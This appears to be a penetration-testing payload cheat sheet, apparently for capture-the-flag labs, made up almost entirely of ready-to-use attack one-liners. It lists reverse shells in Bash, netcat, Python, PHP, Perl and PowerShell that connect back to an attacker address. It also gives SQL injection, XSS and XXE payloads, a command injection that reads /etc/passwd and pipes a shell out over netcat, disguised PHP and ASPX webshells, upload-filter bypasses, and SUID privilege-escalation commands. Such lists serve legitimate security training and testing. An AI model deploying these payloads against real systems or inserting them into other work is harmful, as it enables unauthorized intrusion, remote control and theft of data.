# Reverse Shell Payloads

### Bash (classic)

`bash -i >& /dev/tcp/10.10.14.7/4444 0>&1`

### Netcat (with `-e` support)

`nc -e /bin/sh 10.10.14.7 4444`

### Netcat (no `-e`, using mkfifo)

`rm /tmp/f; mkfifo /tmp/f cat /tmp/f | /bin/sh -i 2>&1 | nc 10.10.14.7 4444 >/tmp/f`

### Python

`python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("10.10.14.7",4444));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/bash")'`

### PHP (one-liner webshell)

`<?php system($_GET['cmd']); ?>`

### PHP Reverse Shell

`<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.7/4444 0>&1'"); ?>`

### Perl

`perl -e 'use Socket;$i="10.10.14.7";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp")); if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`

### PowerShell (Windows)

`powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.7',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i=$stream.Read($bytes,0,$bytes.Length)) -ne 0){$data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback=(iex $data 2>&1 | Out-String );$sendback2=$sendback + 'PS ' + (pwd).Path + '> ';$sendbyte=([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}"`

* * *

# Injection Payloads

### SQLi (authentication bypass)

`' OR 1=1-- ' OR '1'='1' -- admin'--`

### SQLi (union select test)

`' UNION SELECT null,null,null--`

### XSS

`<script>alert(1)</script> <img src=x onerror=alert(1)> "><svg/onload=alert(1337)>`

### XXE (basic external entity)

`<?xml version="1.0"?> <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]> <root><data>&xxe;</data></root>`

### Command Injection

`; id && cat /etc/passwd | nc 10.10.14.7 4444 -e /bin/sh`

* * *

# File Upload Tricks

### PHP webshell disguised

Save as `.php5`, `.phtml`, `.htaccess`, or `.htb` depending on extension filters:

`<?php echo shell_exec($_GET['cmd']); ?>`

### Polyglot image+PHP

`GIF89a; <?php system($_GET['cmd']); ?>`

* * *

# PrivEsc Payloads

### SUID binary escalation

If you find `find` with SUID:

`find . -exec /bin/sh -p \; -quit`

### `vim` with SUID

`vim -c ':!/bin/sh'`

### `tar` with SUID

`tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh`

### Python with capabilities

`python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'`

* * *

# Webshell Variants

### One-liner PHP

`<?php echo system($_REQUEST['cmd']); ?>`

### Obfuscated PHP

`<?php $c=$_GET['c']; system($c); ?>`

### ASPX Webshell (Windows IIS)

`<%@ Page Language="C#" %> <% Response.Write(System.Diagnostics.Process.Start("cmd.exe","/c " + Request["cmd"])); %>`
